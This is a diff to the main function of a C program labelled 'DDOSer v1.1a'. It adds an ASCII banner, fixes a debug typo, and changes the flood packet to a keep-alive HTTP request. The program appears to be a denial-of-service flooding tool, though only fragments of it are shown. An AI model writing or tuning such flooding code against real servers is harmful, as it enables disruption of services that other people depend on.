@@ -21,12 +21,18 @@
 
 bool socket_wait;
 
-
 int main(int argc, const char* argv[])
 {
     socket_wait = true;
     hide_warnings = false;
     srand(time(NULL));
+    printf("█████╗  ██████╗ ██████╗  ███████╗███████╗██████╗\n");
+    printf("██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗\n");
+    printf("██║  ██║██║  ██║██║   ██║███████╗█████╗  ██████╔╝\n");
+    printf("██║  ██║██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗\n");
+    printf("██████╔╝██████╔╝╚██████╔╝███████║███████╗██║  ██║\n");
+    printf("╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n");
+    printf("                                             v1.1a\n");
     info("DDOSer v1.1a by Andrewerr(http://github.com/Andrewerr)");
 #ifdef DEBUG
     info("Starting in DEBUG mode");
@@ -41,7 +47,7 @@ int main(int argc, const char* argv[])
     if (hostname2ip(_host, host)) {
         error("Failed to resolve host:%s", _host);
 #ifdef DEBUG
-        error("DEBUG:hostnam2ip(%s,%s)->%d,host=%s", _host, host, hostname2ip(_host, host), host);
+        error("DEBUG:hostname2ip(%s,%s)->%d,host=%s", _host, host, hostname2ip(_host, host), host);
 #endif
         return -1;
     }
@@ -87,8 +93,8 @@ int main(int argc, const char* argv[])
 #endif
         packet = randstring(PACKET_SIZE);
     } else {
-        packet = (char*)malloc(sizeof(char) * 9);
-        packet = "GET /\r\n";
+        packet = (char*)malloc(sizeof(char) * 35);
+        packet = "HTTP/1.1 GET /\r\nConnection:keep-alive\r\n";
     }
     if (THREAD_COUNT <= 0) {
         error("Bad thread count!");
